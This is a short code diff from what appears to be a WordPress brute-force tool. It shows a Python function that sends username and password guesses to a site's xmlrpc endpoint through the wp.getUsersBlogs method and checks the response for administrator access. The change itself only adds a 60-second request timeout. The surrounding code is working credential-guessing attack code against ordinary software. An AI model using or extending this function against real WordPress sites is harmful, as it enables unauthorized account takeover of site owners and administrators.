@@ -18,7 +18,7 @@ import requests
 
 def wpbrutexmlrpc(xmlrpcurl, user, password):
     postdata = '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{}</value></param><param><value>{}</value></param></params></methodCall>'.format(user, password)
-    brute = requests.post(xmlrpcurl, data=postdata)
+    brute = requests.post(xmlrpcurl, data=postdata, timeout=60)
     try:
         if "isAdmin" in brute.text and "blogid" in brute.text:
             return True
